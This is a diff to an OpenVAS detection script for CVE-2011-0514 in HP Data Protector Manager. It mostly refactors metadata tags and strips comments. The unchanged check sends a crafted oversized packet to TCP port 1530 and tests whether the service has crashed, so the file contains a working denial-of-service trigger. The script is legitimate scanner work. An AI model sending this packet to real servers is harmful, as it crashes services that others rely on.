@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_hp_data_protector_manager_rds_dos_vuln.nasl 7203 2017-09-20 13:01:39Z cfischer $
+# $Id: secpod_hp_data_protector_manager_rds_dos_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
 #
 # HP (OpenView Storage) Data Protector Manager RDS Service Denial of Service Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = "cpe:/a:hp:data_protector";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.900291");
-  script_version("$Revision: 7203 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-20 15:01:39 +0200 (Wed, 20 Sep 2017) $");
+  script_version("$Revision: 11421 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
   script_cve_id("CVE-2011-0514");
   script_tag(name:"cvss_base", value:"5.0");
@@ -46,30 +46,22 @@ if(description)
   script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64549");
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15940/");
 
-  tag_impact = "Successful exploitation will allow attackers to cause denial of
-  service condition.
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
+  service condition.");
 
-  Impact Level: Application.";
+  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector Manager 6.11, Other versions may also be
+  affected.");
 
-  tag_affected = "HP (OpenView Storage) Data Protector Manager 6.11, Other versions may also be
-  affected.";
-
-  tag_insight = "The flaw is caused by an error in the RDS service (rds.exe) when
+  script_tag(name:"insight", value:"The flaw is caused by an error in the RDS service (rds.exe) when
   processing malformed packets sent to port 1530/TCP, which could be exploited by
-  remote attackers to crash an affected server.";
+  remote attackers to crash an affected server.");
 
-  tag_solution = "Upgrade to HP (OpenView Storage) Data Protector version A.06.20 or later, 
+  script_tag(name:"summary", value:"This host is installed with HP (OpenView Storage) Data Protector Manager and is prone
+  to denial of service vulnerability.");
+
+  script_tag(name:"solution", value:"Upgrade to HP (OpenView Storage) Data Protector version A.06.20 or later,
   For updates refer to,
-  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html";
-
-  tag_summary = "This host is installed with HP (OpenView Storage) Data Protector Manager and is prone
-  to denial of service vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"summary", value:tag_summary);
-  script_tag(name:"solution", value:tag_solution);
+  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -85,28 +77,22 @@ get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to th
 ## HP (OpenView Storage) Data Protector Manager default port
 hpMgrPort = 1530;
 
-## Check the port status
 if( ! get_port_state( hpMgrPort ) ) exit( 0 );
 
-##  Open tcp socket
 soc1 = open_sock_tcp( hpMgrPort );
 if( ! soc1 ) exit( 0 );
 
-## Crafted packet with big data packet size
+# nb: Crafted packet with big data packet size
 req = raw_string( 0x23, 0x8c, 0x29, 0xb6,   ## header (always the same)
                   0x64, 0x00, 0x00, 0x00,   ## data packet size (too big)
                   0x41, 0x41, 0x41, 0x41 ); ## data
 
-## send the data
 send( socket:soc1, data:req );
 
-## wait for 2 sec
 sleep( 2 );
 
-## Close socket
 close( soc1 );
 
-## Confirm HP (OpenView Storage) Data Protector Manager alive or dead
 soc2 = open_sock_tcp( hpMgrPort );
 if( ! soc2 ) {
   security_message( port:port );
